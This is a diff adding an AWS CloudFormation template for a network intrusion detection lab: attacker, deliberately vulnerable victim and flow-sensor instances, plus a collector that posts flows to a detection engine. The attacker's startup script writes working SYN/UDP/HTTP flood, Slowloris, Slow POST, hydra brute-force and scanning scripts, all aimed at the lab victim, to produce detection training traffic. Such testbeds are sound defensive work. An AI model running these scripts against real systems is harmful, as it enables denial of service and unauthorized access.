@@ -1,0 +1,624 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: >
+  NIDS v3 Compute — 3 EC2 instances:
+  Attacker (Public), WebServer (Victim), Sensor (IDS).
+  Explicit ENIs for WebServer, Sensor to enable traffic mirroring.
+  UserSimulator runs via docker-compose on a separate manually-managed EC2.
+
+Parameters:
+  KeyPairName:
+    Type: AWS::EC2::KeyPair::KeyName
+    Description: SSH key pair for EC2 access
+  AmazonLinuxAMI:
+    Type: String
+    Description: AMI ID for EC2 instances (pinned to prevent replacement)
+    Default: ami-04d7457c43c292911
+  IDSEngineHost:
+    Type: String
+    Description: IDS Engine hostname (Cloud Map service discovery)
+    Default: engine.nids.local
+
+Resources:
+  # ============================================================
+  # EXPLICIT ENIs (for traffic mirroring source/target)
+  # ============================================================
+  WebServerENI:
+    Type: AWS::EC2::NetworkInterface
+    Properties:
+      SubnetId: !ImportValue NIDS-VictimSubnet-Id
+      GroupSet:
+        - !ImportValue NIDS-SG-Victim
+      PrivateIpAddress: '10.0.1.10'
+      Tags:
+        - Key: Name
+          Value: NIDS-WebServer-ENI
+
+  SensorENI:
+    Type: AWS::EC2::NetworkInterface
+    Properties:
+      SubnetId: !ImportValue NIDS-IDSSubnet-Id
+      GroupSet:
+        - !ImportValue NIDS-SG-Sensor
+      PrivateIpAddress: '10.0.5.10'
+      Tags:
+        - Key: Name
+          Value: NIDS-Sensor-ENI
+
+  # ============================================================
+  # ATTACKER (Public Subnet — attack source, SSM managed)
+  # ============================================================
+  Attacker:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.small
+      ImageId: !Ref AmazonLinuxAMI
+      KeyName: !Ref KeyPairName
+      SubnetId: !ImportValue NIDS-PublicSubnet-Id
+      PrivateIpAddress: '10.0.0.10'
+      SecurityGroupIds:
+        - !ImportValue NIDS-SG-Attacker
+      IamInstanceProfile: !ImportValue NIDS-AttackerInstanceProfile-Name
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          exec > /var/log/nids-userdata.log 2>&1
+          set -ex
+
+          # AL2023: install base tools (hping3/hydra/nmap are in Docker image, not host)
+          dnf update -y
+          dnf install -y python3 python3-pip nmap-ncat curl tar gzip
+
+          # Install Docker
+          dnf install -y docker
+          systemctl enable docker && systemctl start docker
+          usermod -aG docker ec2-user
+
+          # Install Docker Compose v2
+          mkdir -p /usr/local/lib/docker/cli-plugins
+          curl -sL "https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m)" \
+            -o /usr/local/lib/docker/cli-plugins/docker-compose
+          chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
+
+          # Deploy attack orchestration files
+          mkdir -p /opt/nids-attacker/attacks
+          cat > /opt/nids-attacker/Dockerfile << 'DKEOF'
+          FROM python:3.10-slim
+          RUN apt-get update && \
+              apt-get install -y --no-install-recommends \
+                  hping3 nmap hydra netcat-openbsd iputils-ping curl \
+                  iproute2 procps && \
+              pip install --no-cache-dir requests && \
+              rm -rf /var/lib/apt/lists/*
+          COPY attacks/ /opt/attacks/
+          RUN chmod +x /opt/attacks/*.sh
+          CMD ["sleep", "infinity"]
+          DKEOF
+
+          # DDoS attack script — mixed volumetric (SYN flood + UDP flood + HTTP flood)
+          cat > /opt/nids-attacker/attacks/ddos.sh << 'ATKEOF'
+          #!/bin/bash
+          set -e
+          TARGET="${TARGET_IP:-10.0.1.10}"
+          DUR="${DURATION:-60}"
+          echo "[DDoS] Mixed volumetric on $TARGET for ${DUR}s"
+          SYN_DUR=$((DUR * 40 / 100))
+          timeout "${SYN_DUR}" hping3 -S -p 80 --faster "$TARGET" 2>/dev/null &
+          timeout "${SYN_DUR}" hping3 -S -p 8080 --faster "$TARGET" 2>/dev/null &
+          sleep "$SYN_DUR" || true; wait 2>/dev/null || true
+          UDP_DUR=$((DUR * 30 / 100))
+          timeout "${UDP_DUR}" hping3 --udp -p 53 --faster "$TARGET" 2>/dev/null &
+          timeout "${UDP_DUR}" hping3 --udp -p 80 --faster "$TARGET" 2>/dev/null &
+          sleep "$UDP_DUR" || true; wait 2>/dev/null || true
+          HTTP_DUR=$((DUR * 30 / 100))
+          HTTP_END=$(($(date +%s) + HTTP_DUR))
+          while [ "$(date +%s)" -lt "$HTTP_END" ]; do
+            for i in $(seq 1 20); do
+              curl -s -o /dev/null -m 2 "http://${TARGET}/$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' ')" &
+              curl -s -o /dev/null -m 2 -X POST -d "$(head -c 4096 /dev/urandom | base64)" "http://${TARGET}/" &
+            done; wait; sleep 0.1
+          done
+          echo "[DDoS] Done"
+          ATKEOF
+
+          # DoS attack script — Slowloris + Slow POST
+          cat > /opt/nids-attacker/attacks/dos.sh << 'ATKEOF'
+          #!/bin/bash
+          set -e
+          TARGET="${TARGET_IP:-10.0.1.10}"
+          DUR="${DURATION:-60}"
+          echo "[DoS] Slowloris+SlowPOST on $TARGET for ${DUR}s"
+          HALF=$((DUR / 2))
+          python3 -c "
+          import socket, time, random
+          T,P,D='$TARGET',80,$HALF
+          SS=[]
+          for _ in range(200):
+              try:
+                  s=socket.socket(); s.settimeout(4); s.connect((T,P))
+                  s.send(b'GET /?%d HTTP/1.1\r\nHost: '+T.encode()+b'\r\nUser-Agent: Mozilla/5.0\r\n'%(random.randint(1,99999)))
+                  SS.append(s)
+              except: pass
+          print(f'[Slowloris] {len(SS)} conns')
+          end=time.time()+D
+          while time.time()<end:
+              for s in list(SS):
+                  try: s.send(b'X-a: %d\r\n'%random.randint(1,5000))
+                  except: SS.remove(s)
+              time.sleep(10)
+          for s in SS:
+              try: s.close()
+              except: pass
+          " || true
+          # Slow POST
+          python3 -c "
+          import socket, time, random
+          T,P,D='$TARGET',80,$HALF
+          end=time.time()+D
+          while time.time()<end:
+              SS=[]
+              for _ in range(50):
+                  try:
+                      s=socket.socket(); s.settimeout(4); s.connect((T,P))
+                      s.send(f'POST / HTTP/1.1\r\nHost: {T}\r\nContent-Length: {random.randint(100000,1000000)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.encode())
+                      SS.append(s)
+                  except: pass
+              for _ in range(30):
+                  if time.time()>=end: break
+                  for s in list(SS):
+                      try: s.send(b'A')
+                      except: SS.remove(s)
+                  time.sleep(1)
+              for s in SS:
+                  try: s.close()
+                  except: pass
+          " || true
+          echo "[DoS] Done"
+          ATKEOF
+
+          # BruteForce attack script — real SSH/FTP brute-force
+          cat > /opt/nids-attacker/attacks/bruteforce.sh << 'ATKEOF'
+          #!/bin/bash
+          set -e
+          TARGET="${TARGET_IP:-10.0.1.10}"
+          DUR="${DURATION:-60}"
+          echo "[BruteForce] SSH/FTP on $TARGET for ${DUR}s"
+          cat > /tmp/users.txt << 'UF'
+          root
+          admin
+          user
+          test
+          ubuntu
+          deploy
+          UF
+          cat > /tmp/passwords.txt << 'PF'
+          password
+          123456
+          admin
+          root
+          letmein
+          password1
+          12345678
+          qwerty
+          PF
+          SSH_DUR=$((DUR * 40 / 100))
+          timeout "${SSH_DUR}" hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 16 -f -I ssh://"${TARGET}":22 2>&1 | tail -3 || true
+          SSH2_DUR=$((DUR * 30 / 100))
+          timeout "${SSH2_DUR}" hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 16 -f -I -s 2222 ssh://"${TARGET}" 2>&1 | tail -3 || true
+          FTP_DUR=$((DUR * 30 / 100))
+          timeout "${FTP_DUR}" hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 8 -f -I ftp://"${TARGET}" 2>&1 | tail -3 || true
+          echo "[BruteForce] Done"
+          ATKEOF
+
+          # Infiltration attack script — multi-phase APT
+          cat > /opt/nids-attacker/attacks/infiltration.sh << 'ATKEOF'
+          #!/bin/bash
+          set -e
+          TARGET="${TARGET_IP:-10.0.1.10}"
+          DUR="${DURATION:-60}"
+          echo "[Infiltration] APT on $TARGET for ${DUR}s"
+          PHASE=$((DUR / 4))
+          timeout "$PHASE" nmap -sS -sV -T4 --top-ports 500 --max-rate 200 "$TARGET" 2>/dev/null || true
+          ENUM_END=$(($(date +%s) + PHASE))
+          while [ "$(date +%s)" -lt "$ENUM_END" ]; do
+            for p in 21 22 80 443 2222 8080; do
+              echo "HEAD / HTTP/1.0\r\n\r\n" | timeout 2 ncat "$TARGET" "$p" 2>/dev/null || true
+            done; sleep 0.3
+          done
+          LAT_END=$(($(date +%s) + PHASE))
+          while [ "$(date +%s)" -lt "$LAT_END" ]; do
+            SID=$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+            for path in / /admin /login /api /config; do
+              curl -s -o /dev/null -m 2 -H "Cookie: s=${SID}" "http://${TARGET}${path}" 2>/dev/null || true
+              curl -s -o /dev/null -m 2 -H "Cookie: s=${SID}" "http://${TARGET}:8080${path}" 2>/dev/null || true
+            done; sleep 1
+          done
+          EXFIL_END=$(($(date +%s) + PHASE))
+          while [ "$(date +%s)" -lt "$EXFIL_END" ]; do
+            curl -s -o /dev/null -m 3 -X POST -d "$(head -c 8192 /dev/urandom | base64)" "http://${TARGET}/api/" 2>/dev/null || true
+            sleep 0.5
+          done
+          echo "[Infiltration] Done"
+          ATKEOF
+
+          chmod +x /opt/nids-attacker/attacks/*.sh
+
+          # docker-compose.yml for attack orchestration
+          cat > /opt/nids-attacker/docker-compose.yml << 'DCEOF'
+          version: "3.8"
+          x-common: &common
+            build: .
+            restart: "no"
+            environment:
+              TARGET_IP: ${TARGET_IP:-10.0.1.10}
+              DURATION: ${DURATION:-60}
+            network_mode: host
+          services:
+            ddos:
+              <<: *common
+              entrypoint: ["/bin/bash", "/opt/attacks/ddos.sh"]
+            dos:
+              <<: *common
+              entrypoint: ["/bin/bash", "/opt/attacks/dos.sh"]
+            bruteforce:
+              <<: *common
+              entrypoint: ["/bin/bash", "/opt/attacks/bruteforce.sh"]
+            infiltration:
+              <<: *common
+              entrypoint: ["/bin/bash", "/opt/attacks/infiltration.sh"]
+          DCEOF
+
+          # Pre-build the attacker image
+          cd /opt/nids-attacker && docker compose build 2>&1 || true
+
+          systemctl enable amazon-ssm-agent
+          systemctl start amazon-ssm-agent
+      Tags:
+        - Key: Name
+          Value: NIDS-Attacker
+        - Key: Role
+          Value: attacker
+
+  # ============================================================
+  # WEB SERVER (Victim Subnet — HTTP/SSH/FTP target)
+  # ============================================================
+  WebServer:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.small
+      ImageId: !Ref AmazonLinuxAMI
+      KeyName: !Ref KeyPairName
+      NetworkInterfaces:
+        - DeviceIndex: '0'
+          NetworkInterfaceId: !Ref WebServerENI
+      IamInstanceProfile: !ImportValue NIDS-PrivateInstanceProfile-Name
+      UserData:
+        Fn::Base64:
+          Fn::Sub:
+            - |
+              #!/bin/bash
+              exec > /var/log/nids-userdata.log 2>&1
+              set -ex
+              dnf update -y
+              dnf install -y httpd vsftpd python3 python3-pip
+              systemctl enable vsftpd && systemctl start vsftpd
+
+              # Install Docker
+              dnf install -y docker
+              systemctl enable docker && systemctl start docker
+              usermod -aG docker ec2-user
+
+              # Install Docker Compose v2
+              mkdir -p /usr/local/lib/docker/cli-plugins
+              ARCH=$(uname -m)
+              curl -sL "https://github.com/docker/compose/releases/latest/download/docker-compose-linux-${!ARCH}" \
+                -o /usr/local/lib/docker/cli-plugins/docker-compose
+              chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
+
+              # Deploy vulnerable services (SSH brute-force target)
+              mkdir -p /opt/nids-victim
+              cat > /opt/nids-victim/docker-compose.yml << 'DCEOF'
+              services:
+                dvwa:
+                  image: vulnerables/web-dvwa
+                  ports:
+                    - "8080:80"
+                  restart: unless-stopped
+                  mem_limit: 256m
+                weak-ssh:
+                  image: rastasheep/ubuntu-sshd:18.04
+                  ports:
+                    - "2222:22"
+                  restart: unless-stopped
+                  mem_limit: 128m
+              DCEOF
+              cd /opt/nids-victim && docker compose up -d 2>&1 || true
+
+              # ── Deploy ML Web App ──
+              S3_BUCKET="${DataBucket}"
+              MY_REGION="${AWS::Region}"
+              MY_ACCOUNT="${AWS::AccountId}"
+              ECR_BASE="${!MY_ACCOUNT}.dkr.ecr.${!MY_REGION}.amazonaws.com"
+
+              mkdir -p /opt/nids-webapp/models
+              aws s3 cp "s3://${!S3_BUCKET}/webapp/" /opt/nids-webapp/ --recursive --region "${!MY_REGION}" 2>/dev/null || true
+
+              # Stop httpd — ML web app serves on port 80 via Docker
+              systemctl stop httpd 2>/dev/null || true
+              systemctl disable httpd 2>/dev/null || true
+
+              if [ -f /opt/nids-webapp/docker-compose.yml ]; then
+                cd /opt/nids-webapp
+                aws ecr get-login-password --region "${!MY_REGION}" | \
+                  docker login --username AWS --password-stdin "${!ECR_BASE}" 2>&1 || true
+                docker compose pull 2>&1 || true
+                docker compose up -d 2>&1 || true
+              else
+                systemctl enable httpd && systemctl start httpd
+                echo "<h1>NIDS ML Web App — Upload webapp to S3 first</h1>" > /var/www/html/index.html
+              fi
+
+              systemctl enable amazon-ssm-agent && systemctl start amazon-ssm-agent
+            - DataBucket: !ImportValue NIDS-DataBucket
+      Tags:
+        - Key: Name
+          Value: NIDS-WebServer
+        - Key: Role
+          Value: target
+
+  # NOTE: TrafficGen EC2 removed — replaced by UserSimulator (docker-compose
+  #       with 9 virtual users on a separate EC2 in the Public subnet).
+  #       See user_simulator/docker-compose.yml for the replacement.
+
+  # ============================================================
+  # SENSOR (IDS Subnet — YAF flow sensor + IPFIX collector)
+  # ============================================================
+  Sensor:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.small
+      ImageId: !Ref AmazonLinuxAMI
+      KeyName: !Ref KeyPairName
+      NetworkInterfaces:
+        - DeviceIndex: '0'
+          NetworkInterfaceId: !Ref SensorENI
+      IamInstanceProfile: !ImportValue NIDS-SensorInstanceProfile-Name
+      BlockDeviceMappings:
+        - DeviceName: /dev/xvda
+          Ebs:
+            VolumeSize: 30
+            VolumeType: gp3
+      UserData:
+        Fn::Base64: !Sub |
+          #!/bin/bash
+          set -ex
+
+          yum update -y
+          yum groupinstall -y "Development Tools"
+          yum install -y glib2-devel libpcap-devel python3 python3-pip pcre-devel zlib-devel
+
+          pip3 install requests
+
+          # ---- Install libfixbuf 3.x ----
+          cd /tmp
+          curl -sL https://tools.netsa.cert.org/releases/libfixbuf-3.0.0.alpha2.tar.gz -o libfixbuf.tar.gz
+          tar xzf libfixbuf.tar.gz
+          cd libfixbuf-3.0.0.alpha2
+          ./configure --prefix=/usr/local && make -j$(nproc) && make install
+          echo "/usr/local/lib" > /etc/ld.so.conf.d/local.conf
+          echo "/usr/local/lib64" >> /etc/ld.so.conf.d/local.conf
+          ldconfig
+
+          # ---- Install YAF 3.x ----
+          cd /tmp
+          curl -sL https://tools.netsa.cert.org/releases/yaf-3.0.0.alpha4.tar.gz -o yaf.tar.gz
+          tar xzf yaf.tar.gz
+          cd yaf-3.0.0.alpha4
+          export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig:/usr/local/lib64/pkgconfig
+          ./configure --prefix=/usr/local --enable-applabel --enable-entropy --enable-dpi && make -j$(nproc) && make install
+          ldconfig
+
+          # ---- Install super_mediator 2.x ----
+          cd /tmp
+          curl -sL https://tools.netsa.cert.org/releases/super_mediator-2.0.0.alpha3.tar.gz -o sm.tar.gz
+          tar xzf sm.tar.gz
+          cd super_mediator-2.0.0.alpha3
+          ./configure --prefix=/usr/local && make -j$(nproc) && make install
+          ldconfig
+
+          # ---- IPFIX Collector (reads super_mediator JSON, posts to IDS Engine) ----
+          mkdir -p /opt/nids
+          cat > /opt/nids/collector.py << 'PYEOF'
+          import json, logging, os, sys, time, requests
+
+          logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s - %(message)s")
+          log = logging.getLogger("collector")
+
+          ENGINE_URL = os.environ.get("IDS_ENGINE_URL", "http://engine.nids.local:8000")
+          BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "10"))
+          FLUSH_INTERVAL = float(os.environ.get("FLUSH_INTERVAL", "2.0"))
+
+          TCP_FLAG_MAP = {
+              "F": 0x01, "S": 0x02, "R": 0x04, "P": 0x08,
+              "A": 0x10, "U": 0x20, "E": 0x40, "C": 0x80,
+          }
+          TCP_FLAG_FIELDS = {
+              "initialTCPFlags", "unionTCPFlags",
+              "reverseInitialTCPFlags", "reverseUnionTCPFlags",
+          }
+          FLOW_END_REASON_MAP = {
+              "idle": 1, "active": 2, "end": 3, "forced": 4, "lack": 5,
+          }
+
+          def normalize_record(raw):
+              rec = raw.get("flows", raw) if isinstance(raw, dict) else raw
+              for field in TCP_FLAG_FIELDS:
+                  if field in rec and isinstance(rec[field], str):
+                      n = 0
+                      for c in rec[field]:
+                          n |= TCP_FLAG_MAP.get(c, 0)
+                      rec[field] = n
+              if "flowEndReason" in rec:
+                  v = rec["flowEndReason"]
+                  if isinstance(v, str):
+                      rec["flowEndReason"] = FLOW_END_REASON_MAP.get(v.lower().strip(), 0)
+              return rec
+
+          def post_batch(batch):
+              try:
+                  resp = requests.post(f"{ENGINE_URL}/flows", json={"flows": batch, "dataset_type": "yaf"}, timeout=10)
+                  if resp.status_code == 200:
+                      results = resp.json().get("results", [])
+                      attacks = [r for r in results if r.get("predicted_class") != "Benign"]
+                      if attacks:
+                          log.info("Detected %d attacks in batch of %d flows", len(attacks), len(batch))
+                  else:
+                      log.warning("Engine returned %d: %s", resp.status_code, resp.text[:200])
+              except requests.ConnectionError:
+                  log.warning("Cannot reach engine at %s, retrying...", ENGINE_URL)
+              except Exception as e:
+                  log.error("POST error: %s", e)
+
+          def main():
+              log.info("Collector started, engine=%s batch=%d flush=%.1fs", ENGINE_URL, BATCH_SIZE, FLUSH_INTERVAL)
+              batch = []
+              last_flush = time.time()
+              for line in sys.stdin:
+                  line = line.strip()
+                  if not line:
+                      continue
+                  try:
+                      raw = json.loads(line)
+                      record = normalize_record(raw)
+                      batch.append(record)
+                  except json.JSONDecodeError:
+                      continue
+                  now = time.time()
+                  if len(batch) >= BATCH_SIZE or (now - last_flush) >= FLUSH_INTERVAL:
+                      if batch:
+                          post_batch(batch)
+                          batch = []
+                          last_flush = now
+              if batch:
+                  post_batch(batch)
+
+          if __name__ == "__main__":
+              main()
+          PYEOF
+
+          # ---- VXLAN Bridge for Traffic Mirror decapsulation ----
+          # YAF 3.0.0.alpha4 does not support --vxlan-decode; use kernel VXLAN interfaces
+          IFACE=$(ip -o link show | awk -F': ' '!/lo/{print $2; exit}')
+          cat > /etc/systemd/system/vxlan-bridge.service << SVCEOF
+          [Unit]
+          Description=VXLAN Bridge for Traffic Mirror decapsulation
+          After=network.target
+          Before=nids-collector.service yaf-sensor.service
+
+          [Service]
+          Type=oneshot
+          RemainAfterExit=yes
+          ExecStart=/bin/bash -c '\
+            nft add table inet filter 2>/dev/null || true; \
+            nft add chain inet filter input 2>/dev/null || true; \
+            nft add rule inet filter input udp dport 4789 accept 2>/dev/null || true; \
+            ip link add br-mirror type bridge 2>/dev/null || true; \
+            ip link add vxlan-web type vxlan id 0 local 0.0.0.0 dstport 4789 dev ${!IFACE} 2>/dev/null || true; \
+            ip link add vxlan-dns type vxlan id 0 local 0.0.0.0 dstport 4789 dev ${!IFACE} 2>/dev/null || true; \
+            ip link set vxlan-web master br-mirror 2>/dev/null || true; \
+            ip link set vxlan-dns master br-mirror 2>/dev/null || true; \
+            ip link set vxlan-web up; \
+            ip link set vxlan-dns up; \
+            ip link set br-mirror up; \
+            ip link set br-mirror promisc on'
+          ExecStop=/bin/bash -c '\
+            ip link del vxlan-web 2>/dev/null || true; \
+            ip link del vxlan-dns 2>/dev/null || true; \
+            ip link del br-mirror 2>/dev/null || true'
+
+          [Install]
+          WantedBy=multi-user.target
+          SVCEOF
+
+          # ---- super_mediator + collector pipeline (must start BEFORE YAF) ----
+          cat > /etc/systemd/system/nids-collector.service << 'SVCEOF'
+          [Unit]
+          Description=NIDS IPFIX Collector (super_mediator JSON to IDS Engine)
+          After=network.target vxlan-bridge.service
+          Requires=vxlan-bridge.service
+          Before=yaf-sensor.service
+
+          [Service]
+          ExecStart=/bin/bash -c 'stdbuf -oL /usr/local/bin/super_mediator --ipfix-input tcp localhost -p 18000 -o - --output-mode json -f flowStartMilliseconds,flowEndMilliseconds,flowDurationMilliseconds,reverseFlowDeltaMilliseconds,protocolIdentifier,sourceIPv4Address,destinationIPv4Address,sourceTransportPort,destinationTransportPort,octetTotalCount,reverseOctetTotalCount,packetTotalCount,reversePacketTotalCount,flowAttributes,reverseFlowAttributes,ipClassOfService,reverseIpClassOfService,silkAppLabel,flowEndReason,initialTCPFlags,unionTCPFlags,reverseInitialTCPFlags,reverseUnionTCPFlags,tcpUrgTotalCount,reverseTcpUrgTotalCount,dataByteCount,averageInterarrivalTime,standardDeviationInterarrivalTime,smallPacketCount,nonEmptyPacketCount,largePacketCount,firstNonEmptyPacketSize,maxPacketSize,standardDeviationPayloadLength,firstEightNonEmptyPacketDirections,reverseDataByteCount,reverseAverageInterarrivalTime,reverseStandardDeviationInterarrivalTime,reverseSmallPacketCount,reverseNonEmptyPacketCount,reverseLargePacketCount,reverseFirstNonEmptyPacketSize,reverseMaxPacketSize,reverseStandardDeviationPayloadLength 2>/dev/null | /usr/bin/python3 -u /opt/nids/collector.py'
+          Environment=IDS_ENGINE_URL=http://engine.nids.local:8000
+          Restart=always
+          RestartSec=5
+
+          [Install]
+          WantedBy=multi-user.target
+          SVCEOF
+
+          # ---- YAF systemd service (captures on br-mirror bridge) ----
+          cat > /etc/systemd/system/yaf-sensor.service << 'SVCEOF'
+          [Unit]
+          Description=YAF Flow Sensor (bridge mirror capture)
+          After=network.target nids-collector.service vxlan-bridge.service
+          Requires=nids-collector.service vxlan-bridge.service
+
+          [Service]
+          ExecStartPre=/bin/bash -c 'for i in 1 2 3 4 5 6 7 8 9 10; do ss -tln | grep -q 18000 && exit 0; sleep 1; done; exit 1'
+          ExecStart=/usr/local/bin/yaf \
+            --live pcap --in br-mirror \
+            --flow-stats \
+            --applabel \
+            --max-payload 1024 \
+            --idle-timeout 30 \
+            --active-timeout 120 \
+            --out localhost \
+            --ipfix tcp \
+            --ipfix-port 18000
+          Restart=always
+          RestartSec=5
+
+          [Install]
+          WantedBy=multi-user.target
+          SVCEOF
+
+          systemctl daemon-reload
+          systemctl enable vxlan-bridge nids-collector yaf-sensor
+          systemctl start vxlan-bridge
+          sleep 2
+          systemctl start nids-collector
+          sleep 3
+          systemctl start yaf-sensor
+          systemctl enable amazon-ssm-agent && systemctl start amazon-ssm-agent
+      Tags:
+        - Key: Name
+          Value: NIDS-Sensor
+        - Key: Role
+          Value: sensor
+
+Outputs:
+  AttackerId:
+    Value: !Ref Attacker
+    Export:
+      Name: NIDS-Attacker-Id
+  AttackerIP:
+    Value: !GetAtt Attacker.PrivateIp
+    Export:
+      Name: NIDS-Attacker-IP
+  WebServerENIId:
+    Value: !Ref WebServerENI
+    Export:
+      Name: NIDS-WebServerENI-Id
+  SensorENIId:
+    Value: !Ref SensorENI
+    Export:
+      Name: NIDS-SensorENI-Id
+  WebServerIP:
+    Value: '10.0.1.10'
+    Export:
+      Name: NIDS-WebServer-IP
+  WebServerInstanceId:
+    Value: !Ref WebServer
+    Export:
+      Name: NIDS-WebServer-InstanceId
